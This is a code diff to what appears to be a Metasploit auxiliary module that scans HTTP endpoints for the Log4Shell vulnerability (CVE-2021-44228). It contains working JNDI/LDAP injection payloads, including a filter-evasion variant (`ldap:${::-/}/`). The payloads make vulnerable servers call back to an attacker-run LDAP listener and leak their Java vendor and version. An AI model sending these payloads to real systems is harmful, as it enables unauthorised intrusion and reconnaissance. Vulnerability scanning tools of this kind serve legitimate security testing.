@@ -11,12 +11,28 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name' => 'Log4Shell Scanner',
-      'Description' => 'Check and HTTP endpoint for the Log4Shell vulnerability.',
+      'Name' => 'Log4Shell HTTP Scanner',
+      'Description' => %q{
+        Check and HTTP endpoint for the Log4Shell vulnerability. This will try a series of HTTP requests based on the
+        module configuration in an attempt to trigger a LDAP connections from a vulnerable instance.
+      },
       'Author' => [
         'Spencer McIntyre'
       ],
-      'License' => MSF_LICENSE
+      'References' => [
+        [ 'CVE', '2021-44228' ],
+      ],
+      'DisclosureDate' => '2021-12-09',
+      'License' => MSF_LICENSE,
+      'DefaultOptions' => {
+        'SRVPORT' => 389
+      },
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'AKA' => ['Log4Shell', 'LogJam'],
+        'Reliability' => []
+      }
     )
 
     register_options([
@@ -31,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def jndi_string(resource)
-    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}}"
+    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
   end
 
   def on_client_connect(client)
@@ -44,7 +60,8 @@ class MetasploitModule < Msf::Auxiliary
     token, java_version = base_object.split('/', 2)
 
     unless (context = @tokens.delete(token)).nil?
-      details = "#{context[:method]} #{normalize_uri(context[:target_uri])} (header: #{context[:header]})"
+      details = normalize_uri(context[:target_uri]).to_s
+      details << " (header: #{context[:headers].keys.first})" unless context[:headers].nil?
       details << " (java: #{java_version})" unless java_version.blank?
       print_good('Log4Shell found via ' + details)
       report_vuln(
@@ -68,7 +85,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @tokens = {}
-    start_service
+    # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
+    start_service('SSL' => false)
     super
   ensure
     stop_service
@@ -95,27 +113,37 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host_uri(_ip, uri)
-    method = datastore['HTTP_METHOD']
     headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
     headers_file.lines.each do |header|
       header.strip!
       next if header.start_with?('#')
 
       token = rand_text_alpha_lower_numeric(8..32)
-      @tokens[token] = {
-        rhost: rhost,
-        rport: rport,
-        target_uri: uri,
-        method: method,
-        header: header
-      }
-      send_request_raw({
-        'uri' => uri,
-        'method' => method,
-        # https://twitter.com/404death/status/1470243045752721408
-        'headers' => { header => jndi_string("#{token}/${sys:java.vendor}_${sys:java.version}") }
-      })
+      test(token, uri: uri, headers: { header => jndi_string(token) })
     end
+
+    token = rand_text_alpha_lower_numeric(8..32)
+    jndi = jndi_string(token)
+    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))
+
+    token = rand_text_alpha_lower_numeric(8..32)
+    jndi = jndi_string(token)
+    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
+  end
+
+  def test(token, uri: nil, headers: nil)
+    @tokens[token] = {
+      rhost: rhost,
+      rport: rport,
+      target_uri: uri,
+      headers: headers
+    }
+
+    send_request_raw(
+      'uri' => uri,
+      'method' => datastore['HTTP_METHOD'],
+      'headers' => headers
+    )
   end
 
   attr_accessor :tokens
